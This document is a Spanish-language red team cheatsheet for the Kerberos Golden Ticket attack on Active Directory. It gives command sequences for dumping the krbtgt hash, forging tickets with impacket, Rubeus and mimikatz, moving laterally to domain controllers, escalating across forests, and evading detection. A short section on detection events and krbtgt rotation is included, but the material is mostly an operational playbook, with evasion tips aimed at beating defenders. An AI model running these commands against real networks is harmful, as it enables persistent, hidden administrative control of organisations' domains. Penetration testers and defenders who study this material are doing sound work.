---
aliases:
  - Golden Ticket Attack
  - Golden TGT
  - Forged TGT
tags:
  - type/atomic
  - technique/persistence
  - technique/credential-access
  - technique/kerberos
  - env/windows
  - asset/active-directory
  - cred/kerberos
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Exploitation]]"
tertiary categories:
  - "[[Active Directory]]"
type: Atomic
linked:
  - "[[Active Directory Exploitation]]"
  - "[[DCSync]]"
  - "[[Kerberos Pass-the-Ticket]]"
---
# Golden Ticket

***

## Cheatsheet
^golden-ticket

| Paso | Comando |
| --- | --- |
| **Obtener krbtgt hash** | `impacket-secretsdump dom.local/da:pass@DC -just-dc-user krbtgt` |
| **Obtener Domain SID** | `impacket-lookupsid dom.local/user:pass@DC 0` |
| **Forjar (impacket)** | `impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain dom.local administrator` |
| **Forjar (Rubeus)** | `Rubeus.exe golden /rc4:KRBTGT_HASH /user:fakeadmin /domain:dom.local /sid:S-1-5-21-... /ptt` |
| **Forjar (mimikatz)** | `kerberos::golden /user:fakeadmin /domain:dom.local /sid:SID /krbtgt:HASH /ptt` |
| **Usar ticket (Linux)** | `export KRB5CCNAME=admin.ccache; impacket-psexec -k -no-pass DC.dom.local` |
| **Usar ticket (Windows)** | `Rubeus.exe ptt /ticket:BASE64` o cargado con `/ptt` directo |

***

## Concepto

Con el NT hash (o AES key) de la cuenta **krbtgt** se puede forjar un TGT (Ticket-Granting Ticket) arbitrario. Como krbtgt firma todos los TGTs del dominio, un TGT forjado es aceptado por cualquier servicio que haga autenticación Kerberos.

**Características**:
- User arbitrario (existente o ficticio).
- Groups arbitrarios (Domain Admins, Enterprise Admins, etc.) via PAC.
- Duración arbitraria (default mimikatz: 10 años).
- Válido hasta que krbtgt rote password **2 veces** (rotation única no invalida).

**Propósito**: persistence indefinida post-DA compromise. No sirve como vector de escalación inicial.

## Requisitos

- **krbtgt NT hash** (o AES key, preferible post-KB5014746) — vía [[DCSync]] típicamente.
- **Domain SID** (S-1-5-21-x-y-z).
- Conectividad Kerberos al DC (puerto 88).
- Nombre de dominio FQDN.

## 1. Recopilar info

### krbtgt hash
```bash
impacket-secretsdump dom.local/da:password@DC -just-dc-user krbtgt
# dom.local\krbtgt:502:aad3b435...:abc123KRBTGTHASH:::

# AES key (preferible para evadir downgrade detection)
impacket-secretsdump dom.local/da:password@DC -just-dc-user krbtgt
# aes256_hmac:def456AES...
```

### Domain SID
```bash
impacket-lookupsid dom.local/user:pass@DC 0 | grep -i domain
# Domain SID: S-1-5-21-1234567890-987654321-111222333
```

O desde sesión Windows:
```powershell
whoami /user
# user SID: S-1-5-21-XXX-YYY-ZZZ-RID → descartar RID (último número)
Get-DomainSID
```

### FQDN del dominio
```bash
nslookup dom.local
# o
nxc smb DC --users | head -1
```

## 2. Forjar TGT (impacket-ticketer)

```bash
impacket-ticketer \
  -nthash abc123KRBTGTHASH \
  -domain-sid S-1-5-21-1234567890-987654321-111222333 \
  -domain dom.local \
  administrator

# → administrator.ccache generado
```

Opciones:
- `-aesKey HASH` — usar AES en lugar de RC4 (menos detectable).
- `-user-id 500` — RID específico (500 = administrator).
- `-groups 513,512,520,518,519` — Domain Users, DA, Policy Creator, Schema Admins, Enterprise Admins.
- `-extra-sid S-1-5-21-...-519` — sIDHistory para cross-domain / Enterprise Admin.
- `-duration 87600` — horas de validez (default 87600 = 10 años).

## 3. Forjar TGT (Rubeus, on-host Windows)

```powershell
.\Rubeus.exe golden /rc4:KRBTGT_HASH /user:fakeadmin /id:500 /domain:dom.local /sid:S-1-5-21-... /ptt

# Con AES256 (recomendado post-2021)
.\Rubeus.exe golden /aes256:AES_KEY /user:Administrator /id:500 /domain:dom.local /sid:S-1-5-21-... /ptt

# Save a archivo sin inject
.\Rubeus.exe golden /rc4:HASH /user:admin /id:500 /domain:dom.local /sid:SID /outfile:golden.kirbi

# Load después
.\Rubeus.exe ptt /ticket:golden.kirbi

# Cross-domain (SID History)
.\Rubeus.exe golden /rc4:HASH /user:admin /id:500 /domain:child.dom.local /sid:CHILD_SID /sids:PARENT_SID-519 /ptt
```

## 4. Forjar TGT (mimikatz)

```
mimikatz # privilege::debug
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:Administrator /domain:dom.local /sid:S-1-5-21-... /krbtgt:HASH /id:500 /groups:513,512,520,518,519 /ptt
mimikatz # misc::cmd

# Verificar
klist
```

## 5. Usar ticket

### Linux
```bash
export KRB5CCNAME=administrator.ccache

# Listar
klist

# Pivot
impacket-psexec -k -no-pass DC.dom.local
impacket-wmiexec -k -no-pass administrator@DC.dom.local
impacket-smbexec -k -no-pass administrator@DC.dom.local

# SMB access
smbclient.py -k -no-pass -no-pass administrator@DC.dom.local
```

### Windows
```powershell
# Ticket ya inyectado con /ptt → usar herramientas normales
dir \\DC.dom.local\c$
PsExec.exe \\DC.dom.local cmd.exe
Enter-PSSession -ComputerName DC.dom.local
```

## 6. Sapphire Ticket (evasion)

Golden moderno que copia PAC legítimo via S4USelf + S4UProxy → ticket resultante lleva PAC real → evade detecciones basadas en PAC validation.

```bash
# Rubeus
.\Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512,513,518,519,520 /krbkey:HASH

.\Rubeus.exe sapphire /user:target /rc4:KRBTGT /tgs:/path/to/ticket.kirbi
```

## 7. Golden Ticket cross-forest (SID History)

Para escalar de child domain a forest root:

```bash
impacket-ticketer \
  -nthash CHILD_KRBTGT \
  -domain-sid CHILD_SID \
  -domain child.dom.local \
  -extra-sid PARENT_SID-519 \
  administrator
# → EA del forest via SID history
```

## 8. OpSec

### Detecciones (eventos)
- **4769** (TGS request) con User ID inusual o sin 4768 previo.
- **4624** logon con golden → user "fakeadmin" que no existe en AD.
- Mismatch entre username del TGT y RID (típico golden mal configurado).
- Ticket lifetime anómalo (>24h default policy).
- Encryption type RC4 cuando dominio usa AES.

### Tips evasion
- **Usar AES256** (`/aes256:`) no RC4.
- **User real existente** (administrator, no fakeadmin).
- **Lifetime realista** (`/endin:600` = 10h, `/renewmax:10080` = 7d).
- **RID coherente** con username (`/id:500` para administrator).
- **Purge tickets anteriores** antes de inyectar (`kerberos::purge`).
- **Sapphire ticket** si blue team valida PAC.
- **Evitar** usar golden desde el DC — genera 4624 local.

## 9. Invalidación

Golden es válido hasta **doble rotación de krbtgt password**:
```powershell
# Script Microsoft
Reset-KrbTgt.ps1 -mode reset
# Esperar AD replication (mínimo 10h)
Reset-KrbTgt.ps1 -mode reset
```

Rotación simple **no invalida** — krbtgt retiene password anterior para N-1.

## Diferencia Golden vs Silver

| | Golden | Silver |
| --- | --- | --- |
| Key usada | krbtgt hash | Service account hash |
| Tipo ticket | TGT | TGS |
| Scope | Todo el dominio | Servicio específico |
| Persistence | Indefinida | Limitada (rotación service acc) |
| Ruido | Mayor (4768/4769) | Menor (solo 4769) |

## Recursos

- [HackTricks - Golden Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)
- [ADSecurity - Golden Ticket](https://adsecurity.org/?p=1640)
- [Rubeus Wiki - Golden](https://github.com/GhostPack/Rubeus#golden)
- [Microsoft Reset-KrbTgt](https://github.com/microsoft/New-KrbtgtKeys.ps1)

***
